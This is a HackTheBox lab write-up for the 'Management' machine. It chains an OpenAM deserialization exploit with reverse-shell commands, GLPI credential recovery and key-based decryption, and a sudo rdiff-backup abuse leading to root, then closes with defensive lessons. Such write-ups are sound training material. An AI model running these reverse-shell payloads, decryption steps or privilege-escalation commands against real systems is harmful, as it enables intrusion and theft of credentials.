****# HTB Management — Write-up
Oct 1, 2026 · @Gh0ulH4x

---
## IP
```Addr
10.129.23.190
```
---
## Enumeration
- Port Scanning
```bash
PORT      STATE SERVICE     REASON         VERSION
22/tcp    open  ssh         syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44=
|   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
80/tcp    open  http        syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://10.129.23.190/
443/tcp   open  ssl/http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://management.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=management.htb/organizationName=Management Managed Services Ltd
| Subject Alternative Name: DNS:management.htb, DNS:*.management.htb
| Issuer: commonName=management.htb/organizationName=Management Managed Services Ltd
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-06-02T01:21:44
| Not valid after:  2126-05-09T01:21:44
| MD5:     340b 4117 daca 4dc5 ba7e 6724 7406 4f09
| SHA-1:   2a4c d0c3 53fb 774f a3fe d6df 6e5f 0309 5911 670c
| SHA-256: 408e ab66 04ba 0d8c ae55 c9c7 6d7c 860f 03c1 72ea fff1 fa64 8322 bc04 ab63 23a8
| tls-alpn:
|   http/1.1
|   http/1.0
|_  http/0.9
|_ssl-date: TLS randomness does not represent time
1689/tcp  open  java-rmi    syn-ack ttl 63 Java RMI
| rmi-dumpregistry:
|   org.opends.server.protocols.jmx.client-unknown
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @127.0.1.1:44519
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
4444/tcp  open  ssl/krb524? syn-ack ttl 63
| ssl-cert: Subject: commonName=sso.management.htb/organizationName=Administration Connector RSA Self-Signed Certificate
| Issuer: commonName=sso.management.htb/organizationName=Administration Connector RSA Self-Signed Certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-06-02T01:23:59
| Not valid after:  2046-05-28T01:23:59
| MD5:     f9f7 2d79 688a 7e18 848d 3c4a e5a7 928a
| SHA-1:   587d 40bb 52b3 4e25 fcf1 4237 8eda 45ad 7f9e 7e3f
| SHA-256: a213 911c 7e66 33ff b4d4 8daf 6a2e 1ab4 e535 4462 b798 19b4 626d 69b5 871d e591
| fingerprint-strings:
|   LDAPSearchReq:
|     0<0:
|     objectClass1+
|     ds-root-dse
|_    ds-cfg-root-dse-backend0
|_ssl-date: TLS randomness does not represent time
44519/tcp open  java-rmi    syn-ack ttl 63 Java RMI
50389/tcp open  ldap        syn-ack ttl 63 (Anonymous bind OK)
```
---
## Web
- Port 80:443 - Redirect to `https://mnagement.htb`
- Web page contain  Click button which redirect to `https://sso.management.htb/XUI/#Login` which is a legit Login page 
- on  Front it shows `OpenAM` with ersion `16.0.5`  which is vulnerable to `RCE` with #CVE-2026-33439 
- GithubLink
```bash
https://github.com/TheMalwareGuardian/CVE-2026-33439#-cve-2026-33439-openam-pre-auth-rce-via-jatoclientsession-deserialization
```
- Download its Python exploit directory including `Jars` which is java components
- Exploit 
```bash
 python3 Exploit_CVE_2026_33439.py --url https://sso.management.htb/openam/   --command 'sh -i >& /dev/tcp/<Attacker IP>/4444 0>&1' --jars Jars/

  ██████╗ ██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗      ██████╗ ██████╗ ██╗  ██╗█████╗  ██████╗
  ██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗██╔═══╝      ╚════██╗╚════██╗██║  ██║╚════██╗██╔══██
  ██║     ██║   ██║█████╗       █████╔╝██║██╔██║ █████╔╝███████╗      █████╔╝ █████╔╝███████║█████╔╝╚██████║
  ██║     ╚██╗ ██╔╝██╔══╝      ██╔═══╝ ████╔╝██║██╔═══╝ ██═══██║      ╚═══██╗ ╚═══██╗ ╚═══██║╚═══██╗╚════██║
  ╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗██████╔╝     █████╔╝ █████╔╝      ██║█████╔╝ █████╔╝
  ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚═════╝       ╚════╝  ╚════╝       ╚═╝╚════╝  ╚════╝

  CVE-2026-33439 | OpenAM Pre-Auth RCE via jato.clientSession Deserialization | CVSS 9.3 CRITICAL | CWE-502
  Author: TheMalwareGuardian - github.com/TheMalwareGuardian

[*] Probing JATO ViewBean endpoints...
  [OK] https://sso.management.htb/openam/ui/PWResetUserValidation  →  HTTP 200
  [OK] https://sso.management.htb/openam/ui/PWResetQuestion  →  HTTP 200
  [OK] https://sso.management.htb/openam/ui/Login  →  HTTP 200
[*] Target endpoints         | ['/ui/PWResetUserValidation', '/ui/PWResetQuestion', '/ui/Login']
[*] Compiling EvilTranslet   | cmd='sh -i >& /dev/tcp/<Attacker IP>/4444 0>&1'
[+] EvilTranslet compiled    | /tmp/tmpe553wxc5/EvilTranslet.class
[*] Compiling PayloadBuilder ...
[*] Building gadget chain    | PriorityQueue → Column$ColumnComparator → TemplatesImpl → EvilTranslet
[+] Payload ready            | 4340 chars (URL-safe base64)
[*] Payload preview          | rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1...
[*] Delivering payload       | method=GET | /ui/PWResetUserValidation
[*] Server response          | HTTP 200 | 3351 bytes
[*] Delivering payload       | method=GET | /ui/PWResetQuestion
[*] Server response          | HTTP 200 | 3351 bytes
[*] Delivering payload       | method=GET | /ui/Login
[*] Server response          | HTTP 200 | 1468 bytes

[*] Done. Verify execution on the target (out-of-band).
    For HTTP callback:  nc -lvnp 9999  →  --command 'curl http://attacker:9999/pwned'
    For reverse shell:  nc -lvnp 4444  →  --command 'bash -i >& /dev/tcp/attacker/4444 0>&1'
```
- Claimed the Reverse shell

```bash
openam@management:/var/www$ whoami
openam
openam@management:/var/www$ id
uid=996(openam) gid=987(openam) groups=987(openam)
```
- Enumerating the User `openAM`
- can't access `/home/owen` as user `openam`
- Search for Backups `owe`
```bash
find / -type f -iname "*owen*" 2>/dev/null
/etc/sudoers.d/owen-backups
/opt/openam-tomcat/webapps/openam/XUI/org/forgerock/openam/ui/common/views/jsonSchema/iteratees/showEnablePropertyIfAllPropertiesHidden.js
```
- Both are access denied 
- Search for environment variables related or own by `www-data` 
- Reason about `www-data` Because web environments and directory are comes under `www-data` account 
```bash
find /opt/ -type f \( -user "www-data" -iname "*config*" -o -iname "*.sqlite" \) 2>/dev/null

/opt/glpi/src/Glpi/System/Requirement/SessionsConfiguration.php
/opt/glpi/src/Glpi/System/Requirement/SessionsSecurityConfiguration.php
/opt/glpi/src/Glpi/System/Requirement/DbConfiguration.php
/opt/glpi/src/Glpi/Kernel/Listener/PostBootListener/LoadLegacyConfiguration.php
/opt/glpi/src/Glpi/Application/View/Extension/ConfigExtension.php
/opt/glpi/src/Glpi/Application/SystemConfigurator.php
/opt/glpi/public/js/modules/Forms/FieldDestinationMultipleConfig.min.js
/opt/glpi/public/js/modules/Forms/ItemAdvancedConfig.min.js
/opt/glpi/public/js/modules/Forms/DestinationAutoConfigController.min.js
/opt/glpi/public/js/modules/Forms/DestinationAutoConfigController.js
/opt/glpi/public/js/modules/Forms/ItemDropdownAdvancedConfig.min.js
/opt/glpi/public/js/modules/Forms/FieldDestinationMultipleConfig.js
/opt/glpi/public/js/modules/Forms/ItemAdvancedConfig.js
/opt/glpi/templates/pages/2fa/2fa_config.html.twig
/opt/glpi/templates/components/search/displaypreference_config.html.twig
/opt/glpi/config/config_db.php
```
- Found `/opt/glpi/config/config_db.php`
```bash
openam@management:/opt/glpi/config$ ls -la
total 24
drwxr-xr-x  2 www-data www-data 4096 Sep  7 11:41 .
drwxr-xr-x 22 www-data www-data 4096 Sep  7 11:41 ..
-rw-r--r--  1 www-data www-data  273 Jun  2 01:25 config_db.php
-rw-r--r--  1 www-data www-data   32 Jun  2 01:25 glpicrypt.key
-rw-rw----  1 www-data www-data 1704 Jun  2 01:25 oauth.pem
-rw-rw----  1 www-data www-data  451 Jun  2 01:25 oauth.pub

openam@management:/opt/glpi/config$ cat config_db.php
<?php
class DB extends DBmysql {
   public $dbhost = '127.0.0.1';
   public $dbuser = 'glpi';
   public $dbpassword = '@Gh0ulH4x';
   public $dbdefault = 'glpidb';
   public $use_utf8mb4 = true;
   public $allow_datetime = false;
   public $allow_signed_keys = false;
}
```
- Got the `MYSQL` Creds
```bash
openam@management:/opt/glpi/config$ mysql -u glpi -p@Gh0ulH4x
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 33
Server version: 10.11.14-MariaDB-0ubuntu0.24.04.1 Ubuntu 24.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```
- Look for Databases
```bash
ariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| glpidb             |
| information_schema |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [(none)]> use glpidb
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A
```
- Tables 
```
Database changed
MariaDB [glpidb]> show tables;
+----------------------------------------------------------+
| Tables_in_glpidb                                         |
+----------------------------------------------------------+
| glpi_agents                                              |
| glpi_agenttypes                                          |
| glpi_alerts                                              |
| glpi_apiclients                                          |
| glpi_applianceenvironments                               |
| glpi_appliances                                          |
| glpi_appliances_items                                    |
| glpi_appliances_items_relations                          |
| glpi_appliancetypes                                      |
| glpi_assets_assetdefinitions                             |
| glpi_assets_assetmodels                                  |
| glpi_assets_assets                                       |
| glpi_assets_assets_peripheralassets                      |
| glpi_assets_assettypes                                   |
| glpi_assets_customfielddefinitions                       |
| glpi_authldapreplicates                                  |
| glpi_authldaps                                           |
| glpi_authmails                                           |
| glpi_autoupdatesystems                                   |

MariaDB [glpidb]> select * from glpi_authldaps;

|  1 | Management Directory | sso.management.htb | dc=management,dc=htb | cn=svc-glpi,ou=services,dc=management,dc=htb |  389 | NULL      | uid         | uid        |       0 | NULL        | NULL            |                 0 | NULL               | NULL         | NULL           | NULL            | NULL        | NULL         | NULL         | NULL          |      1 |           0 |            0 | NULL        | NULL           | NULL           | 2026-06-02 01:25:41 | Primary directory bind used to synchronise managed client accounts. |          0 |         1 | avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw== | NULL                      | NULL         | NULL         | NULL         | NULL           | NULL              |        0 |             0 |                    0 | NULL          | NULL             | NULL           | 2026-06-02 01:25:41 | NULL             | NULL         | NULL        |        1 |      10 | NULL        |

```
- Gathered an `Management` Privilege hash
```bash
|  1 | Management Directory | sso.management.htb | dc=management,dc=htb | cn=svc-glpi,ou=services,dc=management,dc=htb |  389 | NULL      | uid         | uid        |       0 | NULL        | NULL            |                 0 | NULL               | NULL         | NULL           | NULL            | NULL        | NULL         | NULL         | NULL          |      1 |           0 |            0 | NULL        | NULL           | NULL           | 2026-06-02 01:25:41 | Primary directory bind used to synchronise managed client accounts. |          0 |         1 | avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw== | NULL                      | NULL         | NULL         | NULL         | NULL           | NULL              |        0 |             0 |                    0 | NULL          | NULL             | NULL           | 2026-06-02 01:25:41 | NULL             | NULL         | NULL        |        1 |      10 | NULL        |
```
- Initially hash looks like `base64` but its an encrypted algorithm which is `glpicrypt`
- GLPI doesn't hash secrets like the LDAP bind password — it **encrypts** them, because the application needs the plaintext back to actually bind to the directory later. GLPI implements this with libsodium's **XChaCha20-Poly1305 (IETF variant)**, an authenticated encryption (AEAD) cipher: it both encrypts the data and attaches a tag that detects tampering.
```bash
The scheme GLPI uses is straightforward once you know its shape:

- A single **symmetric key** is generated at install time and stored in `glpicrypt.key` inside the config directory.
- For every value encrypted, GLPI generates a fresh random **nonce** (number used once) and prepends it to the ciphertext before base64-encoding the whole thing for storage. For XChaCha20-Poly1305-IETF, the nonce is `SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES` (24) bytes long.
- Decryption just reverses this: base64-decode, split off the first 24 bytes as the nonce, treat the rest as ciphertext+tag, and call `sodium_crypto_aead_xchacha20poly1305_ietf_decrypt()` with the key, nonce, and (in GLPI's case) the nonce reused as additional authenticated data.
```
- This is a **reversible, not one-way, cryptographic scheme** — by design, since GLPI must recover the plaintext to use it. That design choice is reasonable _as long as the key stays secret_. The vulnerability here isn't in the cipher (XChaCha20-Poly1305 is a modern, well-regarded AEAD construction with no known practical attack) — it's that the key and the ciphertext ended up **readable by the same compromised account**. Once an attacker can read both `glpicrypt.key` and the database row, decryption is a five-line script, exactly as shown in the walkthrough:
```bash
openam@management:/opt/glpi/config$ ls -la
total 24
drwxr-xr-x  2 www-data www-data 4096 Sep  7 11:41 .
drwxr-xr-x 22 www-data www-data 4096 Sep  7 11:41 ..
-rw-r--r--  1 www-data www-data  273 Jun  2 01:25 config_db.php
-rw-r--r--  1 www-data www-data   32 Jun  2 01:25 glpicrypt.key
-rw-rw----  1 www-data www-data 1704 Jun  2 01:25 oauth.pem
-rw-rw----  1 www-data www-data  451 Jun  2 01:25 oauth.pub
openam@management:/opt/glpi/config$ php -r "
> \$key = file_get_contents('/opt/glpi/config/glpicrypt.key');
> \$ciphertext = base64_decode('avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==');
> \$nonce = substr(\$ciphertext, 0, SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES);
> \$data  = substr(\$ciphertext, SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES);
> \$plain = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt(\$data, \$nonce, \$nonce, \$key);
> echo \$plain . PHP_EOL;
> "
@Gh0ulH4x
```
- Got the Password - `@Gh0ulH4x`
- This recovered the LDAP bind password for `svc-glpi`, which turned out to be reused (directly or via directory sync) as the password for the local Linux account **`owen`**, allowing SSH login and access to the user flag.
```bash
$ ssh owen@management.htb
owen@management.htb's password:
Welcome to Ubuntu 24.04.5 LTS (GNU/Linux 6.8.0-139-generic x86_64)'

owen@management:~$ ls -la
total 28
drwxr-x--- 3 owen owen 4096 Sep  7 11:41 .
drwxr-xr-x 3 root root 4096 Sep  7 11:41 ..
lrwxrwxrwx 1 root root    9 Sep  7 11:09 .bash_history -> /dev/null
-rw-r--r-- 1 owen owen  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 owen owen 3771 Mar 31  2024 .bashrc
drwx------ 2 owen owen 4096 Sep  7 11:41 .cache
-rw-r--r-- 1 owen owen  807 Mar 31  2024 .profile
-rw-r----- 1 root owen   33 Oct  1 08:24 user.txt
owen@management:~$ cat user.txt
@Gh0ulH4x
```
- User Flag - `@Gh0ulH4x`
### Privilege Escalation
- User `OWEN` Enumeration
```bash
owen@management:~$ id
uid=1000(owen) gid=1000(owen) groups=1000(owen)
owen@management:~$ whoami
owen
owen@management:~$ sudo -l
Matching Defaults entries for owen on management:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User owen may run the following commands on management:
    (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
```
- We Have Root access for` rdiff-backup` command
- At first glance this looks reasonably safe: `owen` can only invoke `rdiff-backup` in _server_ mode, restricted to read-only access inside `/opt/backup`. In practice, this rule is exploitable because of how `rdiff-backup`'s client/server architecture and its `--remote-schema` option interact with `sudo`'s wildcard matching — covered in the deep dive below.
- Escalation
```bash
owen@management:~$ rdiff-backup --remote-schema "sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s"  backup /::/root /tmp/root_backup
WARNING: this command line interface is deprecated and will disappear, start using the new one as described with '--new --help'.
WARNING: Server will be called with deprecated command line interface to guarantee compatibility. It might lead to a deprecation warning from newer rdiff-backup versions. Use '--api-version 201' (or higher) to avoid it.
NOTE: Starting mirror from source path /root to destination path /tmp/root_backup
owen@management:~$ cd /tmp
owen@management:/tmp$ cd root_backup/
owen@management:/tmp/root_backup$ ls -la
total 44
drwx------  7 owen owen 4096 Oct  1 08:24 .
drwxrwxrwt 17 root root 4096 Oct  1 11:35 ..
lrwxrwxrwx  1 owen owen    9 Oct  1 11:35 .bash_history -> /dev/null
-rw-r--r--  1 owen owen 3106 Apr 22  2024 .bashrc
drwx------  3 owen owen 4096 Sep  7 11:41 .cache
drwx------  3 owen owen 4096 Sep  7 11:41 .config
drwxr-xr-x  3 owen owen 4096 Sep  7 11:41 .local
-rw-r--r--  1 owen owen  161 Apr 22  2024 .profile
drwx------  3 owen owen 4096 Oct  1 11:35 rdiff-backup-data
-rw-r-----  1 owen owen   33 Oct  1 08:24 root.txt
drwx------  2 owen owen 4096 Sep  7 11:41 .ssh
-rw-r--r--  1 owen owen  177 Sep  7 11:06 .wget-hsts

owen@management:/tmp/root_backup$ cat root.txt
@Gh0ulH4x
```
- Root Flag - `@Gh0ulH4x`
- The backup copied `/root` to `/tmp/root_backup`, including `root.txt` and, critically, the contents of `root/.ssh/`: a private key (`id_ed25519`) and its matching `authorized_keys`. That private key authenticated directly as root over SSH
- Already have the backup for the User `Root`
```bash
owen@management:/tmp/root_backup$ cd .ssh
owen@management:/tmp/root_backup/.ssh$ ls -la
total 20
drwx------ 2 owen owen 4096 Sep  7 11:41 .
drwx------ 7 owen owen 4096 Oct  1 08:24 ..
-rw------- 1 owen owen   97 Jul 16 15:37 authorized_keys
-rw------- 1 owen owen  411 Jul 16 15:37 id_ed25519
-rw-r--r-- 1 owen owen   97 Jul 16 15:37 id_ed25519.pub
owen@management:/tmp/root_backup/.ssh$ ssh -i id_ed25519 root@localhost
The authenticity of host ''localhost (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'localhost' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04.5 LTS (GNU/Linux 6.8.0-139-generic x86_64)

root@management:~# whoami
root
root@management:~# id
uid=0(root) gid=0(root) groups=0(root)
```
## Summary

**Management** is an Easy-rated Linux box built around an identity-management stack: an OpenAM SSO portal fronting a GLPI IT service-management instance. The path from unauthenticated access to root runs through four stages:

1. A pre-authentication Java deserialization vulnerability in OpenAM 16.0.5 (CVE-2026-33439) gives remote code execution as the `openam` service account.
2. From that foothold, a GLPI database configuration file leaks a MariaDB credential.
3. The GLPI database holds an LDAP bind password encrypted with a reversible scheme (`glpicrypt`, libsodium XChaCha20-Poly1305), and the decryption key sits on disk next to the ciphertext — recovering it yields SSH access as the user `owen`.
4. A narrowly-scoped but exploitable `sudo` rule around `rdiff-backup` lets `owen` pull a full backup of `/root`, including its SSH keys, leading to root.

Each stage follows the same pattern: a strong security control (RCE-resistant deserialization libraries, encrypted secrets, restricted sudo) undone by one implementation gap. The technical deep dives below unpack each gap in turn.

## Broader Lessons

Each stage of this chain maps to a vulnerability class that shows up repeatedly in real environments, not just CTF boxes:

**1. Unauthenticated Java deserialization (CVE-2026-33439).** Deserializing untrusted input with Java's native object format is inherently dangerous whenever dangerous "gadget" classes are reachable on the classpath — and legacy enterprise software (SSO servers, app servers, middleware) tends to carry exactly those classes as transitive dependencies. Mitigations: upgrade affected software promptly; where patching lags, use deserialization allow-lists (e.g. `ObjectInputFilter` in modern Java) or disable native Java deserialization of untrusted input entirely in favor of formats like JSON/Protobuf that don't invoke arbitrary code on parse; monitor for anomalous outbound connections from identity/SSO servers, which are high-value, internet-facing targets.

**2. Secrets in web-application config files, readable across trust boundaries.** `config_db.php` being world-readable (or readable by any local account that compromises the web stack) is a basic but extremely common misconfiguration. Database credentials, API keys, and encryption keys should be stored with the tightest file permissions the runtime allows (owned by the service account only, mode `0600`/`0640`), and ideally pulled from a secrets manager or environment-injected at runtime rather than committed to a readable file at all.

**3. Reversible encryption with key and ciphertext co-located.** GLPI's design — a strong AEAD cipher, but key and encrypted data reachable by the same compromised account — illustrates that cryptographic _strength_ doesn't help if key _isolation_ fails. Whenever an application needs to recover a plaintext secret (as opposed to just verifying one, which calls for hashing), the decryption key should live somewhere a web-application compromise can't reach: a hardware security module, a dedicated secrets-management service (Vault, AWS KMS/Secrets Manager, etc.), or at minimum a different trust boundary/host than the application and its database.

**4. Overly permissive `sudo` wildcard rules for "restricted" tooling.** Granting `NOPASSWD` sudo access to a backup, sync, or admin tool with a trailing wildcard is a frequent escalation vector precisely because the tool's own flag-parsing behavior is rarely audited against the sudoers rule. General hardening guidance:

- Avoid trailing wildcards in sudoers entries; enumerate the exact arguments permitted wherever feasible.
- Favor tools/wrapper scripts that validate and canonicalize their arguments before re-invoking the real binary, rather than trusting a prefix match.
- Treat any sudo rule around backup, sync, or file-transfer utilities as high-risk — these tools exist specifically to move files across privilege boundaries, which is also exactly what an attacker wants.
- Periodically audit `sudo -l` output across hosts against known GTFOBins-style bypass patterns for the permitted binaries.
## Appendix — Redactions & Scope

For a publishable write-up, the following have been intentionally redacted or omitted from the account above:

- **Flag values** (user and root) — per common CTF/HTB write-up convention, flags aren't republished verbatim; readers who complete the box will see them directly.
- **The MariaDB plaintext password** recovered from `config_db.php`, and the final decrypted LDAP/`owen` password — the _method_ of recovery is the educational content; the specific secret value isn't.
- **The attacker's own VPN/callback IP address** used for the reverse shell — personal infrastructure detail, not relevant to the technique.
- The machine's **target IP** (`10.129.23.190`) and **hostnames** (`management.htb`, `sso.management.htb`) are retained, since these are HTB-assigned lab identifiers rather than real infrastructure.
- Full exploit source code for CVE-2026-33439 is not reproduced here; the write-up links to the public proof-of-concept repository and summarizes its mechanism instead.

This document is intended for educational and portfolio purposes, documenting a retired/practice HackTheBox machine.